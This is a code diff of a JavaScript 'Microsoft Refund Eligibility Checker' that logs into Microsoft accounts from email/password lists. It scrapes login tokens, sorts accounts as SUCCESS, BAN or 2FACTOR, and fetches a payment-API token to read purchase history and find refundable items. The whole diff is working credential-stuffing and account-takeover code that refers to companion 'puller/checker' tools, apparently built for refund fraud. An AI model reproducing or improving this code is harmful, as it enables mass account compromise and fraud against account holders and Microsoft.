@@ -1,5 +1,6 @@
 // ============================================================
 //  Microsoft Refund Eligibility Checker
+//  Uses the SAME proven auth flow as the puller/checker tools.
 //  Logs into Microsoft accounts, fetches order/purchase history,
 //  and checks if any digital items are within the 14-day refund window.
 // ============================================================
@@ -11,6 +12,7 @@ const REFUND_WINDOW_DAYS = 14;
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 2000;
 
+// Same OAuth URL used by the puller for Outlook scope (gives us PIFD access)
 const AUTHORIZE_URL =
   "https://login.live.com/oauth20_authorize.srf" +
   "?client_id=0000000048170EF2" +
@@ -26,64 +28,7 @@ const COMMON_HEADERS = {
   "Accept-Encoding": "gzip, deflate",
 };
 
-function parseLR(text, left, right) {
-  try {
-    const start = text.indexOf(left);
-    if (start === -1) return "";
-    const s = start + left.length;
-    const end = text.indexOf(right, s);
-    if (end === -1) return "";
-    return text.substring(s, end);
-  } catch {
-    return "";
-  }
-}
-
-function parseLRRe(text, left, right) {
-  const escaped = left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-  const escapedR = right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-  const m = text.match(new RegExp(`${escaped}(.*?)${escapedR}`, "s"));
-  return m ? m[1] : "";
-}
-
-function checkStatus(text, url, cookiesStr) {
-  if (
-    text.includes("Your account or password is incorrect") ||
-    text.includes("That Microsoft account doesn\\'t exist") ||
-    text.includes("That Microsoft account doesn't exist") ||
-    text.includes("Sign in to your Microsoft account") ||
-    text.includes("timed out")
-  ) return "FAILURE";
-  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
-  if (
-    text.includes("account.live.com/recover?mkt") || text.includes("recover?mkt") ||
-    text.includes("account.live.com/identity/confirm?mkt") || text.includes("Email/Confirm?mkt")
-  ) return "2FACTOR";
-  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
-  if ((cookiesStr.includes("ANON") || cookiesStr.includes("WLSSC")) &&
-      url.includes("https://login.live.com/oauth20_desktop.srf?")) return "SUCCESS";
-  return "UNKNOWN_FAILURE";
-}
-
-function isWithinRefundWindow(dateStr) {
-  const formats = [
-    /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}$/,
-    /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/,
-    /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+$/,
-    /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z$/,
-    /^\d{4}-\d{2}-\d{2}$/,
-  ];
-  const cleaned = dateStr.split("+")[0].split("Z")[0].substring(0, 26);
-  const dt = new Date(cleaned);
-  if (isNaN(dt.getTime())) return { eligible: false, dt: null };
-  const diffMs = Date.now() - dt.getTime();
-  const diffDays = diffMs / (1000 * 60 * 60 * 24);
-  return { eligible: diffDays <= REFUND_WINDOW_DAYS, dt };
-}
-
-function sleep(ms) {
-  return new Promise((r) => setTimeout(r, ms));
-}
+// ── Cookie Jar ──────────────────────────────────────────────
 
 class CookieJar {
   constructor() { this.cookies = {}; }
@@ -102,6 +47,8 @@ class CookieJar {
     return JSON.stringify(this.cookies);
   }
 }
+
+// ── Session helpers (manual redirect to preserve cookies) ───
 
 async function sessionGet(url, jar, extraHeaders = {}) {
   let currentUrl = url;
@@ -152,6 +99,58 @@ async function sessionPost(url, body, jar, extraHeaders = {}) {
   throw new Error("Too many redirects");
 }
 
+// ── Dynamic PPFT + urlPost extraction (same as puller) ──────
+
+function parseLR(text, left, right) {
+  try {
+    const start = text.indexOf(left);
+    if (start === -1) return "";
+    const s = start + left.length;
+    const end = text.indexOf(right, s);
+    if (end === -1) return "";
+    return text.substring(s, end);
+  } catch { return ""; }
+}
+
+function parseLRRe(text, left, right) {
+  const escaped = left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const escapedR = right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const m = text.match(new RegExp(`${escaped}(.*?)${escapedR}`, "s"));
+  return m ? m[1] : "";
+}
+
+function checkStatus(text, url, cookiesStr) {
+  if (
+    text.includes("Your account or password is incorrect") ||
+    text.includes("That Microsoft account doesn\\'t exist") ||
+    text.includes("That Microsoft account doesn't exist") ||
+    text.includes("Sign in to your Microsoft account") ||
+    text.includes("timed out")
+  ) return "FAILURE";
+  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
+  if (
+    text.includes("account.live.com/recover?mkt") || text.includes("recover?mkt") ||
+    text.includes("account.live.com/identity/confirm?mkt") || text.includes("Email/Confirm?mkt")
+  ) return "2FACTOR";
+  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
+  if ((cookiesStr.includes("ANON") || cookiesStr.includes("WLSSC")) &&
+      url.includes("https://login.live.com/oauth20_desktop.srf?")) return "SUCCESS";
+  return "UNKNOWN_FAILURE";
+}
+
+function isWithinRefundWindow(dateStr) {
+  const cleaned = dateStr.split("+")[0].split("Z")[0].substring(0, 26);
+  const dt = new Date(cleaned);
+  if (isNaN(dt.getTime())) return { eligible: false, dt: null };
+  const diffMs = Date.now() - dt.getTime();
+  const diffDays = diffMs / (1000 * 60 * 60 * 24);
+  return { eligible: diffDays <= REFUND_WINDOW_DAYS, dt };
+}
+
+function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+
+// ── Main check logic ────────────────────────────────────────
+
 async function attemptCheck(email, password) {
   const result = {
     user: email, password,
@@ -162,15 +161,34 @@ async function attemptCheck(email, password) {
   const jar = new CookieJar();
 
   try {
+    // Step 1: Get login page with DYNAMIC PPFT extraction
     const r0 = await sessionGet(AUTHORIZE_URL, jar);
+
+    // Dynamic PPFT extraction — same patterns as puller
     let ppft = parseLR(r0.text, 'name="PPFT" id="i0327" value="', '"');
     if (!ppft) ppft = parseLRRe(r0.text, "sFT:'", "'");
+    if (!ppft) ppft = parseLRRe(r0.text, 'sFTTag:\'', "'");
+    if (!ppft) {
+      // Fallback: any PPFT value tag
+      const ppftMatch = r0.text.match(/name="PPFT"[^>]*value="([^"]+)"/);
+      if (ppftMatch) ppft = ppftMatch[1];
+    }
+    if (!ppft) {
+      const ppftMatch2 = r0.text.match(/value=\\"(.+?)\\"/s) || r0.text.match(/value="(.+?)"/s);
+      if (ppftMatch2) ppft = ppftMatch2[1];
+    }
     if (!ppft) { result.detail = "PPFT not found"; return result; }
 
+    // Dynamic urlPost extraction — same patterns as puller
     let urlPost = parseLRRe(r0.text, "urlPost:'", "'");
     if (!urlPost) urlPost = parseLRRe(r0.text, 'urlPost:"', '"');
+    if (!urlPost) {
+      const upMatch = r0.text.match(/"urlPost":"(.+?)"/s) || r0.text.match(/urlPost:'(.+?)'/s);
+      if (upMatch) urlPost = upMatch[1];
+    }
     if (!urlPost) { result.detail = "urlPost not found"; return result; }
 
+    // Step 2: POST credentials
     const postData = new URLSearchParams({
       ps: "2", PPFT: ppft, PPSX: "PassportRN", NewUser: "1",
       login: email, loginfmt: email, passwd: password,
@@ -201,7 +219,7 @@ async function attemptCheck(email, password) {
       return result;
     }
 
-    // Get PIFD token
+    // Step 3: Get PIFD token for payment API access
     let pifdToken = "";
     try {
       const r2 = await sessionGet(
